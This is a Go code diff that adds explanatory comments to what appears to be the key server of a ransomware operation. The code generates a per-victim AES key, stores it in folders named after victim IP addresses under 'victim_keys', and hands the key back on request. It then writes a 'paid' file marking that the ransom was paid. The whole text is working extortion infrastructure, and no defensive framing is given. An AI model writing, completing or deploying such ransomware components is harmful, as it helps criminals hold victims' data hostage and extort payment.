@@ -51,11 +51,13 @@ func getKey(w http.ResponseWriter, r *http.Request) {
 
 	targetDir := strings.Split(r.Host, ":")[0]
 
+	// change directory to victim_keys and the directory of the victim to store the key.
 	err = changeDir(targetDir)
 	if err != nil {
 		return
 	}
 
+	// open the key file
 	file, err := os.Open(keyFile)
 	if err != nil {
 		http.Error(w, "Error opening file", http.StatusInternalServerError)
@@ -64,6 +66,7 @@ func getKey(w http.ResponseWriter, r *http.Request) {
 	}
 	defer file.Close()
 
+	// read key from file
 	key, err := io.ReadAll(file)
 	if err != nil {
 		http.Error(w, "Error reading file", http.StatusInternalServerError)
@@ -71,6 +74,7 @@ func getKey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// send key to client
 	_, err = w.Write(key)
 	if err != nil {
 		http.Error(w, "Error writing response", http.StatusInternalServerError)
@@ -78,6 +82,7 @@ func getKey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// create file to indicate that the ransom has been paid
 	file, err = os.Create("paid")
 	if err != nil {
 		fmt.Println("Error creating paid file:", err)
@@ -98,6 +103,7 @@ func createkey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// generate AES key
 	key := make([]byte, 32)
 	_, err = rand.Read(key)
 	if err != nil {
@@ -107,6 +113,7 @@ func createkey(w http.ResponseWriter, r *http.Request) {
 
 	dirForHost := strings.Split(r.Host, ":")[0]
 
+	// change directory to victim_keys and the directory of the victim to store the key.
 	err = changeDir(dirForHost)
 	if err != nil {
 		return
@@ -145,6 +152,8 @@ func createkey(w http.ResponseWriter, r *http.Request) {
 }
 
 func changeDir(targetDir string) error {
+
+	// check if directory exists, if not create it
 	_, err := os.Stat(keyDirectory)
 	if err != nil {
 		err = os.Mkdir(keyDirectory, 0755)
@@ -153,11 +162,13 @@ func changeDir(targetDir string) error {
 		}
 	}
 
+	// change directory to victim_keys
 	err = os.Chdir(keyDirectory)
 	if err != nil {
 		return fmt.Errorf("error changing directory to victim_keys: %w", err)
 	}
 
+	// check if directory exists, if not create it
 	_, err = os.Stat(targetDir)
 	if err != nil {
 		err = os.Mkdir(targetDir, 0755)
@@ -166,6 +177,7 @@ func changeDir(targetDir string) error {
 		}
 	}
 
+	// change directory to victim IP name as directory name
 	err = os.Chdir(targetDir)
 	if err != nil {
 		return fmt.Errorf("error changing directory to victim directory: %w", err)
